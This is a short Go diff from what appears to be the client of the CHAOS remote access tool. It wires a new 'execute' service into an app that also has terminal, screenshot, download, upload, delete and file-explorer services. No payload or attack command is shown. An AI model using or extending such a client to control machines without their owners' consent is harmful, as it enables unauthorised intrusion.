@@ -2,12 +2,15 @@ package app
 
 import (
 	"context"
+	"log"
+
 	"github.com/tiagorlampert/CHAOS/client/app/environment"
 	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
 	"github.com/tiagorlampert/CHAOS/client/app/services/download"
+	"github.com/tiagorlampert/CHAOS/client/app/services/execute"
 	"github.com/tiagorlampert/CHAOS/client/app/services/explorer"
 	"github.com/tiagorlampert/CHAOS/client/app/services/information"
 	"github.com/tiagorlampert/CHAOS/client/app/services/os"
@@ -17,7 +20,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
 	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 	"golang.org/x/sync/errgroup"
-	"log"
 )
 
 type App struct {
@@ -35,6 +37,7 @@ func New(configuration *environment.Configuration) *App {
 		Terminal:    terminalService,
 		Screenshot:  screenshot.NewService(),
 		Download:    download.NewService(configuration, clientGateway),
+		Execute:     execute.NewService(configuration, terminalService, clientGateway),
 		Upload:      upload.NewService(configuration, httpClient),
 		Delete:      delete.NewService(),
 		Explorer:    explorer.NewService(),
